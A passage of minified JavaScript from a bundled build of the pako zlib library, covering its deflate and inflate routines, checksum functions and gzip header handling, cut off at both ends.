h.Buf8(t.length),r=0,i=e.length;r<i;r++)e[r]=t.charCodeAt(r);return e},r.buf2string=function(t,e){var r,i,n,s,a=e||t.length,o=new Array(2*a);for(r=i=0;r<a;)if((n=t[r++])<128)o[i++]=n;else if(4<(s=u[n]))o[i++]=65533,r+=s-1;else{for(n&=2===s?31:3===s?15:7;1<s&&r<a;)n=n<<6|63&t[r++],s--;1<s?o[i++]=65533:n<65536?o[i++]=n:(n-=65536,o[i++]=55296|n>>10&1023,o[i++]=56320|1023&n)}return l(o,i)},r.utf8border=function(t,e){var r;for((e=e||t.length)>t.length&&(e=t.length),r=e-1;0<=r&&128==(192&t[r]);)r--;return r<0?e:0===r?e:r+u[t[r]]>e?r:e}},{"./common":41}],43:[function(t,e,r){"use strict";e.exports=function(t,e,r,i){for(var n=65535&t|0,s=t>>>16&65535|0,a=0;0!==r;){for(r-=a=2e3<r?2e3:r;s=s+(n=n+e[i++]|0)|0,--a;);n%=65521,s%=65521}return n|s<<16|0}},{}],44:[function(t,e,r){"use strict";e.exports={Z_NO_FLUSH:0,Z_PARTIAL_FLUSH:1,Z_SYNC_FLUSH:2,Z_FULL_FLUSH:3,Z_FINISH:4,Z_BLOCK:5,Z_TREES:6,Z_OK:0,Z_STREAM_END:1,Z_NEED_DICT:2,Z_ERRNO:-1,Z_STREAM_ERROR:-2,Z_DATA_ERROR:-3,Z_BUF_ERROR:-5,Z_NO_COMPRESSION:0,Z_BEST_SPEED:1,Z_BEST_COMPRESSION:9,Z_DEFAULT_COMPRESSION:-1,Z_FILTERED:1,Z_HUFFMAN_ONLY:2,Z_RLE:3,Z_FIXED:4,Z_DEFAULT_STRATEGY:0,Z_BINARY:0,Z_TEXT:1,Z_UNKNOWN:2,Z_DEFLATED:8}},{}],45:[function(t,e,r){"use strict";var o=function(){for(var t,e=[],r=0;r<256;r++){t=r;for(var i=0;i<8;i++)t=1&t?3988292384^t>>>1:t>>>1;e[r]=t}return e}();e.exports=function(t,e,r,i){var n=o,s=i+r;t^=-1;for(var a=i;a<s;a++)t=t>>>8^n[255&(t^e[a])];return-1^t}},{}],46:[function(t,e,r){"use strict";var h,d=t("../utils/common"),u=t("./trees"),c=t("./adler32"),p=t("./crc32"),i=t("./messages"),l=0,f=4,m=0,_=-2,g=-1,b=4,n=2,v=8,y=9,s=286,a=30,o=19,w=2*s+1,k=15,x=3,S=258,z=S+x+1,C=42,E=113,A=1,I=2,O=3,B=4;function R(t,e){return t.msg=i[e],e}function T(t){return(t<<1)-(4<t?9:0)}function D(t){for(var e=t.length;0<=--e;)t[e]=0}function F(t){var e=t.state,r=e.pending;r>t.avail_out&&(r=t.avail_out),0!==r&&(d.arraySet(t.output,e.pending_buf,e.pending_out,r,t.next_out),t.next_out+=r,e.pending_out+=r,t.total_out+=r,t.avail_out-=r,e.pending-=r,0===e.pending&&(e.pending_out=0))}function N(t,e){u._tr_flush_block(t,0<=t.block_start?t.block_start:-1,t.strstart-t.block_start,e),t.block_start=t.strstart,F(t.strm)}function U(t,e){t.pending_buf[t.pending++]=e}function P(t,e){t.pending_buf[t.pending++]=e>>>8&255,t.pending_buf[t.pending++]=255&e}function L(t,e){var r,i,n=t.max_chain_length,s=t.strstart,a=t.prev_length,o=t.nice_match,h=t.strstart>t.w_size-z?t.strstart-(t.w_size-z):0,u=t.window,l=t.w_mask,f=t.prev,d=t.strstart+S,c=u[s+a-1],p=u[s+a];t.prev_length>=t.good_match&&(n>>=2),o>t.lookahead&&(o=t.lookahead);do{if(u[(r=e)+a]===p&&u[r+a-1]===c&&u[r]===u[s]&&u[++r]===u[s+1]){s+=2,r++;do{}while(u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&u[++s]===u[++r]&&s<d);if(i=S-(d-s),s=d-S,a<i){if(t.match_start=e,o<=(a=i))break;c=u[s+a-1],p=u[s+a]}}}while((e=f[e&l])>h&&0!=--n);return a<=t.lookahead?a:t.lookahead}function j(t){var e,r,i,n,s,a,o,h,u,l,f=t.w_size;do{if(n=t.window_size-t.lookahead-t.strstart,t.strstart>=f+(f-z)){for(d.arraySet(t.window,t.window,f,f,0),t.match_start-=f,t.strstart-=f,t.block_start-=f,e=r=t.hash_size;i=t.head[--e],t.head[e]=f<=i?i-f:0,--r;);for(e=r=f;i=t.prev[--e],t.prev[e]=f<=i?i-f:0,--r;);n+=f}if(0===t.strm.avail_in)break;if(a=t.strm,o=t.window,h=t.strstart+t.lookahead,u=n,l=void 0,l=a.avail_in,u<l&&(l=u),r=0===l?0:(a.avail_in-=l,d.arraySet(o,a.input,a.next_in,l,h),1===a.state.wrap?a.adler=c(a.adler,o,l,h):2===a.state.wrap&&(a.adler=p(a.adler,o,l,h)),a.next_in+=l,a.total_in+=l,l),t.lookahead+=r,t.lookahead+t.insert>=x)for(s=t.strstart-t.insert,t.ins_h=t.window[s],t.ins_h=(t.ins_h<<t.hash_shift^t.window[s+1])&t.hash_mask;t.insert&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[s+x-1])&t.hash_mask,t.prev[s&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=s,s++,t.insert--,!(t.lookahead+t.insert<x)););}while(t.lookahead<z&&0!==t.strm.avail_in)}function Z(t,e){for(var r,i;;){if(t.lookahead<z){if(j(t),t.lookahead<z&&e===l)return A;if(0===t.lookahead)break}if(r=0,t.lookahead>=x&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+x-1])&t.hash_mask,r=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart),0!==r&&t.strstart-r<=t.w_size-z&&(t.match_length=L(t,r)),t.match_length>=x)if(i=u._tr_tally(t,t.strstart-t.match_start,t.match_length-x),t.lookahead-=t.match_length,t.match_length<=t.max_lazy_match&&t.lookahead>=x){for(t.match_length--;t.strstart++,t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+x-1])&t.hash_mask,r=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart,0!=--t.match_length;);t.strstart++}else t.strstart+=t.match_length,t.match_length=0,t.ins_h=t.window[t.strstart],t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+1])&t.hash_mask;else i=u._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++;if(i&&(N(t,!1),0===t.strm.avail_out))return A}return t.insert=t.strstart<x-1?t.strstart:x-1,e===f?(N(t,!0),0===t.strm.avail_out?O:B):t.last_lit&&(N(t,!1),0===t.strm.avail_out)?A:I}function W(t,e){for(var r,i,n;;){if(t.lookahead<z){if(j(t),t.lookahead<z&&e===l)return A;if(0===t.lookahead)break}if(r=0,t.lookahead>=x&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+x-1])&t.hash_mask,r=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart),t.prev_length=t.match_length,t.prev_match=t.match_start,t.match_length=x-1,0!==r&&t.prev_length<t.max_lazy_match&&t.strstart-r<=t.w_size-z&&(t.match_length=L(t,r),t.match_length<=5&&(1===t.strategy||t.match_length===x&&4096<t.strstart-t.match_start)&&(t.match_length=x-1)),t.prev_length>=x&&t.match_length<=t.prev_length){for(n=t.strstart+t.lookahead-x,i=u._tr_tally(t,t.strstart-1-t.prev_match,t.prev_length-x),t.lookahead-=t.prev_length-1,t.prev_length-=2;++t.strstart<=n&&(t.ins_h=(t.ins_h<<t.hash_shift^t.window[t.strstart+x-1])&t.hash_mask,r=t.prev[t.strstart&t.w_mask]=t.head[t.ins_h],t.head[t.ins_h]=t.strstart),0!=--t.prev_length;);if(t.match_available=0,t.match_length=x-1,t.strstart++,i&&(N(t,!1),0===t.strm.avail_out))return A}else if(t.match_available){if((i=u._tr_tally(t,0,t.window[t.strstart-1]))&&N(t,!1),t.strstart++,t.lookahead--,0===t.strm.avail_out)return A}else t.match_available=1,t.strstart++,t.lookahead--}return t.match_available&&(i=u._tr_tally(t,0,t.window[t.strstart-1]),t.match_available=0),t.insert=t.strstart<x-1?t.strstart:x-1,e===f?(N(t,!0),0===t.strm.avail_out?O:B):t.last_lit&&(N(t,!1),0===t.strm.avail_out)?A:I}function M(t,e,r,i,n){this.good_length=t,this.max_lazy=e,this.nice_length=r,this.max_chain=i,this.func=n}function H(){this.strm=null,this.status=0,this.pending_buf=null,this.pending_buf_size=0,this.pending_out=0,this.pending=0,this.wrap=0,this.gzhead=null,this.gzindex=0,this.method=v,this.last_flush=-1,this.w_size=0,this.w_bits=0,this.w_mask=0,this.window=null,this.window_size=0,this.prev=null,this.head=null,this.ins_h=0,this.hash_size=0,this.hash_bits=0,this.hash_mask=0,this.hash_shift=0,this.block_start=0,this.match_length=0,this.prev_match=0,this.match_available=0,this.strstart=0,this.match_start=0,this.lookahead=0,this.prev_length=0,this.max_chain_length=0,this.max_lazy_match=0,this.level=0,this.strategy=0,this.good_match=0,this.nice_match=0,this.dyn_ltree=new d.Buf16(2*w),this.dyn_dtree=new d.Buf16(2*(2*a+1)),this.bl_tree=new d.Buf16(2*(2*o+1)),D(this.dyn_ltree),D(this.dyn_dtree),D(this.bl_tree),this.l_desc=null,this.d_desc=null,this.bl_desc=null,this.bl_count=new d.Buf16(k+1),this.heap=new d.Buf16(2*s+1),D(this.heap),this.heap_len=0,this.heap_max=0,this.depth=new d.Buf16(2*s+1),D(this.depth),this.l_buf=0,this.lit_bufsize=0,this.last_lit=0,this.d_buf=0,this.opt_len=0,this.static_len=0,this.matches=0,this.insert=0,this.bi_buf=0,this.bi_valid=0}function G(t){var e;return t&&t.state?(t.total_in=t.total_out=0,t.data_type=n,(e=t.state).pending=0,e.pending_out=0,e.wrap<0&&(e.wrap=-e.wrap),e.status=e.wrap?C:E,t.adler=2===e.wrap?0:1,e.last_flush=l,u._tr_init(e),m):R(t,_)}function K(t){var e=G(t);return e===m&&function(t){t.window_size=2*t.w_size,D(t.head),t.max_lazy_match=h[t.level].max_lazy,t.good_match=h[t.level].good_length,t.nice_match=h[t.level].nice_length,t.max_chain_length=h[t.level].max_chain,t.strstart=0,t.block_start=0,t.lookahead=0,t.insert=0,t.match_length=t.prev_length=x-1,t.match_available=0,t.ins_h=0}(t.state),e}function Y(t,e,r,i,n,s){if(!t)return _;var a=1;if(e===g&&(e=6),i<0?(a=0,i=-i):15<i&&(a=2,i-=16),n<1||y<n||r!==v||i<8||15<i||e<0||9<e||s<0||b<s)return R(t,_);8===i&&(i=9);var o=new H;return(t.state=o).strm=t,o.wrap=a,o.gzhead=null,o.w_bits=i,o.w_size=1<<o.w_bits,o.w_mask=o.w_size-1,o.hash_bits=n+7,o.hash_size=1<<o.hash_bits,o.hash_mask=o.hash_size-1,o.hash_shift=~~((o.hash_bits+x-1)/x),o.window=new d.Buf8(2*o.w_size),o.head=new d.Buf16(o.hash_size),o.prev=new d.Buf16(o.w_size),o.lit_bufsize=1<<n+6,o.pending_buf_size=4*o.lit_bufsize,o.pending_buf=new d.Buf8(o.pending_buf_size),o.d_buf=1*o.lit_bufsize,o.l_buf=3*o.lit_bufsize,o.level=e,o.strategy=s,o.method=r,K(t)}h=[new M(0,0,0,0,function(t,e){var r=65535;for(r>t.pending_buf_size-5&&(r=t.pending_buf_size-5);;){if(t.lookahead<=1){if(j(t),0===t.lookahead&&e===l)return A;if(0===t.lookahead)break}t.strstart+=t.lookahead,t.lookahead=0;var i=t.block_start+r;if((0===t.strstart||t.strstart>=i)&&(t.lookahead=t.strstart-i,t.strstart=i,N(t,!1),0===t.strm.avail_out))return A;if(t.strstart-t.block_start>=t.w_size-z&&(N(t,!1),0===t.strm.avail_out))return A}return t.insert=0,e===f?(N(t,!0),0===t.strm.avail_out?O:B):(t.strstart>t.block_start&&(N(t,!1),t.strm.avail_out),A)}),new M(4,4,8,4,Z),new M(4,5,16,8,Z),new M(4,6,32,32,Z),new M(4,4,16,16,W),new M(8,16,32,32,W),new M(8,16,128,128,W),new M(8,32,128,256,W),new M(32,128,258,1024,W),new M(32,258,258,4096,W)],r.deflateInit=function(t,e){return Y(t,e,v,15,8,0)},r.deflateInit2=Y,r.deflateReset=K,r.deflateResetKeep=G,r.deflateSetHeader=function(t,e){return t&&t.state?2!==t.state.wrap?_:(t.state.gzhead=e,m):_},r.deflate=function(t,e){var r,i,n,s;if(!t||!t.state||5<e||e<0)return t?R(t,_):_;if(i=t.state,!t.output||!t.input&&0!==t.avail_in||666===i.status&&e!==f)return R(t,0===t.avail_out?-5:_);if(i.strm=t,r=i.last_flush,i.last_flush=e,i.status===C)if(2===i.wrap)t.adler=0,U(i,31),U(i,139),U(i,8),i.gzhead?(U(i,(i.gzhead.text?1:0)+(i.gzhead.hcrc?2:0)+(i.gzhead.extra?4:0)+(i.gzhead.name?8:0)+(i.gzhead.comment?16:0)),U(i,255&i.gzhead.time),U(i,i.gzhead.time>>8&255),U(i,i.gzhead.time>>16&255),U(i,i.gzhead.time>>24&255),U(i,9===i.level?2:2<=i.strategy||i.level<2?4:0),U(i,255&i.gzhead.os),i.gzhead.extra&&i.gzhead.extra.length&&(U(i,255&i.gzhead.extra.length),U(i,i.gzhead.extra.length>>8&255)),i.gzhead.hcrc&&(t.adler=p(t.adler,i.pending_buf,i.pending,0)),i.gzindex=0,i.status=69):(U(i,0),U(i,0),U(i,0),U(i,0),U(i,0),U(i,9===i.level?2:2<=i.strategy||i.level<2?4:0),U(i,3),i.status=E);else{var a=v+(i.w_bits-8<<4)<<8;a|=(2<=i.strategy||i.level<2?0:i.level<6?1:6===i.level?2:3)<<6,0!==i.strstart&&(a|=32),a+=31-a%31,i.status=E,P(i,a),0!==i.strstart&&(P(i,t.adler>>>16),P(i,65535&t.adler)),t.adler=1}if(69===i.status)if(i.gzhead.extra){for(n=i.pending;i.gzindex<(65535&i.gzhead.extra.length)&&(i.pending!==i.pending_buf_size||(i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),F(t),n=i.pending,i.pending!==i.pending_buf_size));)U(i,255&i.gzhead.extra[i.gzindex]),i.gzindex++;i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),i.gzindex===i.gzhead.extra.length&&(i.gzindex=0,i.status=73)}else i.status=73;if(73===i.status)if(i.gzhead.name){n=i.pending;do{if(i.pending===i.pending_buf_size&&(i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),F(t),n=i.pending,i.pending===i.pending_buf_size)){s=1;break}s=i.gzindex<i.gzhead.name.length?255&i.gzhead.name.charCodeAt(i.gzindex++):0,U(i,s)}while(0!==s);i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),0===s&&(i.gzindex=0,i.status=91)}else i.status=91;if(91===i.status)if(i.gzhead.comment){n=i.pending;do{if(i.pending===i.pending_buf_size&&(i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),F(t),n=i.pending,i.pending===i.pending_buf_size)){s=1;break}s=i.gzindex<i.gzhead.comment.length?255&i.gzhead.comment.charCodeAt(i.gzindex++):0,U(i,s)}while(0!==s);i.gzhead.hcrc&&i.pending>n&&(t.adler=p(t.adler,i.pending_buf,i.pending-n,n)),0===s&&(i.status=103)}else i.status=103;if(103===i.status&&(i.gzhead.hcrc?(i.pending+2>i.pending_buf_size&&F(t),i.pending+2<=i.pending_buf_size&&(U(i,255&t.adler),U(i,t.adler>>8&255),t.adler=0,i.status=E)):i.status=E),0!==i.pending){if(F(t),0===t.avail_out)return i.last_flush=-1,m}else if(0===t.avail_in&&T(e)<=T(r)&&e!==f)return R(t,-5);if(666===i.status&&0!==t.avail_in)return R(t,-5);if(0!==t.avail_in||0!==i.lookahead||e!==l&&666!==i.status){var o=2===i.strategy?function(t,e){for(var r;;){if(0===t.lookahead&&(j(t),0===t.lookahead)){if(e===l)return A;break}if(t.match_length=0,r=u._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++,r&&(N(t,!1),0===t.strm.avail_out))return A}return t.insert=0,e===f?(N(t,!0),0===t.strm.avail_out?O:B):t.last_lit&&(N(t,!1),0===t.strm.avail_out)?A:I}(i,e):3===i.strategy?function(t,e){for(var r,i,n,s,a=t.window;;){if(t.lookahead<=S){if(j(t),t.lookahead<=S&&e===l)return A;if(0===t.lookahead)break}if(t.match_length=0,t.lookahead>=x&&0<t.strstart&&(i=a[n=t.strstart-1])===a[++n]&&i===a[++n]&&i===a[++n]){s=t.strstart+S;do{}while(i===a[++n]&&i===a[++n]&&i===a[++n]&&i===a[++n]&&i===a[++n]&&i===a[++n]&&i===a[++n]&&i===a[++n]&&n<s);t.match_length=S-(s-n),t.match_length>t.lookahead&&(t.match_length=t.lookahead)}if(t.match_length>=x?(r=u._tr_tally(t,1,t.match_length-x),t.lookahead-=t.match_length,t.strstart+=t.match_length,t.match_length=0):(r=u._tr_tally(t,0,t.window[t.strstart]),t.lookahead--,t.strstart++),r&&(N(t,!1),0===t.strm.avail_out))return A}return t.insert=0,e===f?(N(t,!0),0===t.strm.avail_out?O:B):t.last_lit&&(N(t,!1),0===t.strm.avail_out)?A:I}(i,e):h[i.level].func(i,e);if(o!==O&&o!==B||(i.status=666),o===A||o===O)return 0===t.avail_out&&(i.last_flush=-1),m;if(o===I&&(1===e?u._tr_align(i):5!==e&&(u._tr_stored_block(i,0,0,!1),3===e&&(D(i.head),0===i.lookahead&&(i.strstart=0,i.block_start=0,i.insert=0))),F(t),0===t.avail_out))return i.last_flush=-1,m}return e!==f?m:i.wrap<=0?1:(2===i.wrap?(U(i,255&t.adler),U(i,t.adler>>8&255),U(i,t.adler>>16&255),U(i,t.adler>>24&255),U(i,255&t.total_in),U(i,t.total_in>>8&255),U(i,t.total_in>>16&255),U(i,t.total_in>>24&255)):(P(i,t.adler>>>16),P(i,65535&t.adler)),F(t),0<i.wrap&&(i.wrap=-i.wrap),0!==i.pending?m:1)},r.deflateEnd=function(t){var e;return t&&t.state?(e=t.state.status)!==C&&69!==e&&73!==e&&91!==e&&103!==e&&e!==E&&666!==e?R(t,_):(t.state=null,e===E?R(t,-3):m):_},r.deflateSetDictionary=function(t,e){var r,i,n,s,a,o,h,u,l=e.length;if(!t||!t.state)return _;if(2===(s=(r=t.state).wrap)||1===s&&r.status!==C||r.lookahead)return _;for(1===s&&(t.adler=c(t.adler,e,l,0)),r.wrap=0,l>=r.w_size&&(0===s&&(D(r.head),r.strstart=0,r.block_start=0,r.insert=0),u=new d.Buf8(r.w_size),d.arraySet(u,e,l-r.w_size,r.w_size,0),e=u,l=r.w_size),a=t.avail_in,o=t.next_in,h=t.input,t.avail_in=l,t.next_in=0,t.input=e,j(r);r.lookahead>=x;){for(i=r.strstart,n=r.lookahead-(x-1);r.ins_h=(r.ins_h<<r.hash_shift^r.window[i+x-1])&r.hash_mask,r.prev[i&r.w_mask]=r.head[r.ins_h],r.head[r.ins_h]=i,i++,--n;);r.strstart=i,r.lookahead=x-1,j(r)}return r.strstart+=r.lookahead,r.block_start=r.strstart,r.insert=r.lookahead,r.lookahead=0,r.match_length=r.prev_length=x-1,r.match_available=0,t.next_in=o,t.input=h,t.avail_in=a,r.wrap=s,m},r.deflateInfo="pako deflate (from Nodeca project)"},{"../utils/common":41,"./adler32":43,"./crc32":45,"./messages":51,"./trees":52}],47:[function(t,e,r){"use strict";e.exports=function(){this.text=0,this.time=0,this.xflags=0,this.os=0,this.extra=null,this.extra_len=0,this.name="",this.comment="",this.hcrc=0,this.done=!1}},{}],48:[function(t,e,r){"use strict";e.exports=function(t,e){var r,i,n,s,a,o,h,u,l,f,d,c,p,m,_,g,b,v,y,w,k,x,S,z,C;r=t.state,i=t.next_in,z=t.input,n=i+(t.avail_in-5),s=t.next_out,C=t.output,a=s-(e-t.avail_out),o=s+(t.avail_out-257),h=r.dmax,u=r.wsize,l=r.whave,f=r.wnext,d=r.window,c=r.hold,p=r.bits,m=r.lencode,_=r.distcode,g=(1<<r.lenbits)-1,b=(1<<r.distbits)-1;t:do{p<15&&(c+=z[i++]<<p,p+=8,c+=z[i++]<<p,p+=8),v=m[c&g];e:for(;;){if(c>>>=y=v>>>24,p-=y,0===(y=v>>>16&255))C[s++]=65535&v;else{if(!(16&y)){if(0==(64&y)){v=m[(65535&v)+(c&(1<<y)-1)];continue e}if(32&y){r.mode=12;break t}t.msg="invalid literal/length code",r.mode=30;break t}w=65535&v,(y&=15)&&(p<y&&(c+=z[i++]<<p,p+=8),w+=c&(1<<y)-1,c>>>=y,p-=y),p<15&&(c+=z[i++]<<p,p+=8,c+=z[i++]<<p,p+=8),v=_[c&b];r:for(;;){if(c>>>=y=v>>>24,p-=y,!(16&(y=v>>>16&255))){if(0==(64&y)){v=_[(65535&v)+(c&(1<<y)-1)];continue r}t.msg="invalid distance code",r.mode=30;break t}if(k=65535&v,p<(y&=15)&&(c+=z[i++]<<p,(p+=8)<y&&(c+=z[i++]<<p,p+=8)),h<(k+=c&(1<<y)-1)){t.msg="invalid distance too far back",r.mode=30;break t}if(c>>>=y,p-=y,(y=s-a)<k){if(l<(y=k-y)&&r.sane){t.msg="invalid distance too far back",r.mode=30;break t}if(S=d,(x=0)===f){if(x+=u-y,y<w){for(w-=y;C[s++]=d[x++],--y;);x=s-k,S=C}}else if(f<y){if(x+=u+f-y,(y-=f)<w){for(w-=y;C[s++]=d[x++],--y;);if(x=0,f<w){for(w-=y=f;C[s++]=d[x++],--y;);x=s-k,S=C}}}else if(x+=f-y,y<w){for(w-=y;C[s++]=d[x++],--y;);x=s-k,S=C}for(;2<w;)C[s++]=S[x++],C[s++]=S[x++],C[s++]=S[x++],w-=3;w&&(C[s++]=S[x++],1<w&&(C[s++]=S[x++]))}else{for(x=s-k;C[s++]=C[x++],C[s++]=C[x++],C[s++]=C[x++],2<(w-=3););w&&(C[s++]=C[x++],1<w&&(C[s++]=C[x++]))}break}}break}}while(i<n&&s<o);i-=w=p>>3,c&=(1<<(p-=w<<3))-1,t.next_in=i,t.next_out=s,t.avail_in=i<n?n-i+5:5-(i-n),t.avail_out=s<o?o-s+257:257-(s-o),r.hold=c,r.bits=p}},{}],49:[function(t,e,r){"use strict";var I=t("../utils/common"),O=t("./adler32"),B=t("./crc32"),R=t("./inffast"),T=t("./inftrees"),D=1,F=2,N=0,U=-2,P=1,i=852,n=592;function L(t){return(t>>>24&255)+(t>>>8&65280)+((65280&t)<<8)+((255&t)<<24)}function s(){this.mode=0,this.last=!1,this.wrap=0,this.havedict=!1,this.flags=0,this.dmax=0,this.check=0,this.total=0,this.head=null,this.wbits=0,this.wsize=0,this.whave=0,this.wnext=0,this.window=null,this.hold=0,this.bits=0,this.length=0,this.offset=0,this.extra=0,this.lencode=null,this.distcode=null,this.lenbits=0,this.distbits=0,this.ncode=0,this.nlen=0,this.ndist=0,this.have=0,this.next=null,this.lens=new I.Buf16(320),this.work=new I.Buf16(288),this.lendyn=null,this.distdyn=null,this.sane=0,this.back=0,this.was=0}function a(t){var e;return t&&t.state?(e=t.state,t.total_in=t.total_out=e.total=0,t.msg="",e.wrap&&(t.adler=1&e.wrap),e.mode=P,e.last=0,e.havedict=0,e.dmax=32768,e.head=null,e.hold=0,e.bits=0,e.lencode=e.lendyn=new I.Buf32(i),e.distcode=e.distdyn=new I.Buf32(n),e.sane=1,e.back=-1,N):U}function o(t){var e;return t&&t.state?((e=t.state).wsize=0,e.whave=0,e.wnext=0,a(t)):U}function h(t,e){var r,i;return t&&t.state?(i=t.state,e<0?(r=0,e=-e):(r=1+(e>>4),e<48&&(e&=15)),e&&(e<8||15<e)?U:(null!==i.window&&i.wbits!==e&&(i.window=null),i.wrap=r,i.wbits=e,o(t))):U}function u(t,e){var r,i;return t?(i=new s,(t.state=i).window=null,(r=h(t,e))!==N&&(t.state=null),r):U}var l,f,d=!0;function j(t){if(d){var e;for(l=new I.Buf32(512),f=new I.Buf32(32),e=0;e<144;)t.lens[e++]=8;for(;e<256;)t.lens[e++]=9;for(;e<280;)t.lens[e++]=7;for(;e<288;)t.lens[e++]=8;for(T(D,t.lens,0,288,l,0,t.work,{bits:9}),e=0;e<32;)t.lens[e++]=5;T(F,t.lens,0,32,f,0,t.work,{bits:5}),d=!1}t.lencode=l,t.lenbits=9,t.distcode=f,t.distbits=5}function Z(t,e,r,i){var n,s=t.state;return null===s.window&&(s.wsize=1<<s.wbits,s.wnext=0,s.whave=0,s.window=new I.Buf8(s.wsize)),i>=s.wsize?(I.arraySet(s.window,e,r-s.wsize,s.wsize,0),s.wnext=0,s.whave=s.wsize):(i<(n=s.wsize-s.wnext)&&(n=i),I.arraySet(s.window,e,r-i,n,s.wnext),(i-=n)?(I.arraySet(s.window,e,r-i,i,0),s.wnext=i,s.whave=s.wsize):(s.wnext+=n,s.wnext===s.wsize&&(s.wnext=0),s.whave<s.wsize&&(s.whave+=n))),0}r.inflateReset=o,r.inflateReset2=h,r.inflateResetKeep=a,r.inflateInit=function(t){return u(t,15)},r.inflateInit2=u,r.inflate=function(t,e){var r,i,n,s,a,o,h,u,l,f,d,c,p,m,_,g,b,v,y,w,k,x,S,z,C=0,E=new I.Buf8(4),A=[16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15];if(!t||!t.state||!t.output||!t.input&&0!==t.avail_in)return U;12===(r=t.state).mode&&(r.mode=13),a=t.next_out,n=t.output,h=t.avail_out,s=t.next_in,i=t.input,o=t.avail_in,u=r.hold,l=r.bits,f=o,d=h,x=N;t:for(;;)switch(r.mode){case P:if(0===r.wrap){r.mode=13;break}for(;l<16;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(2&r.wrap&&35615===u){E[r.check=0]=255&u,E[1]=u>>>8&255,r.check=B(r.check,E,2,0),l=u=0,r.mode=2;break}if(r.flags=0,r.head&&(r.head.done=!1),!(1&r.wrap)||(((255&u)<<8)+(u>>8))%31){t.msg="incorrect header check",r.mode=30;break}if(8!=(15&u)){t.msg="unknown compression method",r.mode=30;break}if(l-=4,k=8+(15&(u>>>=4)),0===r.wbits)r.wbits=k;else if(k>r.wbits){t.msg="invalid window size",r.mode=30;break}r.dmax=1<<k,t.adler=r.check=1,r.mode=512&u?10:12,l=u=0;break;case 2:for(;l<16;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(r.flags=u,8!=(255&r.flags)){t.msg="unknown compression method",r.mode=30;break}if(57344&r.flags){t.msg="unknown header flags set",r.mode=30;break}r.head&&(r.head.text=u>>8&1),512&r.flags&&(E[0]=255&u,E[1]=u>>>8&255,r.check=B(r.check,E,2,0)),l=u=0,r.mode=3;case 3:for(;l<32;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.head&&(r.head.time=u),512&r.flags&&(E[0]=255&u,E[1]=u>>>8&255,E[2]=u>>>16&255,E[3]=u>>>24&255,r.check=B(r.check,E,4,0)),l=u=0,r.mode=4;case 4:for(;l<16;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.head&&(r.head.xflags=255&u,r.head.os=u>>8),512&r.flags&&(E[0]=255&u,E[1]=u>>>8&255,r.check=B(r.check,E,2,0)),l=u=0,r.mode=5;case 5:if(1024&r.flags){for(;l<16;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}r.length=u,r.head&&(r.head.extra_len=u),512&r.flags&&(E[0]=255&u,E[1]=u>>>8&255,r.check=B(r.check,E,2,0)),l=u=0}else r.head&&(r.head.extra=null);r.mode=6;case 6:if(1024&r.flags&&(o<(c=r.length)&&(c=o),c&&(r.head&&(k=r.head.extra_len-r.length,r.head.extra||(r.head.extra=new Array(r.head.extra_len)),I.arraySet(r.head.extra,i,s,c,k)),512&r.flags&&(r.check=B(r.check,i,c,s)),o-=c,s+=c,r.length-=c),r.length))break t;r.length=0,r.mode=7;case 7:if(2048&r.flags){if(0===o)break t;for(c=0;k=i[s+c++],r.head&&k&&r.length<65536&&(r.head.name+=String.fromCharCode(k)),k&&c<o;);if(512&r.flags&&(r.check=B(r.check,i,c,s)),o-=c,s+=c,k)break t}else r.head&&(r.head.name=null);r.length=0,r.mode=8;case 8:if(4096&r.flags){if(0===o)break t;for(c=0;k=i[s+c++],r.head&&k&&r.length<65536&&(r.head.comment+=String.fromCharCode(k)),k&&c<o;);if(512&r.flags&&(r.check=B(r.check,i,c,s)),o-=c,s+=c,k)break t}else r.head&&(r.head.comment=null);r.mode=9;case 9:if(512&r.flags){for(;l<16;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}if(u!==(65535&r.check)){t.msg="header crc mismatch",r.mode=30;break}l=u=0}r.head&&(r.head.hcrc=r.flags>>9&1,r.head.done=!0),t.adler=r.check=0,r.mode=12;break;case 10:for(;l<32;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}t.adler=r.check=L(u),l=u=0,r.mode=11;case 11:if(0===r.havedict)return t.next_out=a,t.avail_out=h,t.next_in=s,t.avail_in=o,r.hold=u,r.bits=l,2;t.adler=r.check=1,r.mode=12;case 12:if(5===e||6===e)break t;case 13:if(r.last){u>>>=7&l,l-=7&l,r.mode=27;break}for(;l<3;){if(0===o)break t;o--,u+=i[s++]<<l,l+=8}switch(r.last=1&u,l-=1,3&(u>>>=1)){case 0:r.mode=14;break;case 1:if(j(r),r.mode=20,6!==e)break;u>>>=2,l-=2;break t;case 2:r.mode=17;break;case 3:t.msg="invalid block type",r.mode=30}u>>>=2,l-=2;break;case 14:for(u>>>=7&l,l-=7&l;l<32;){if(0===o)break 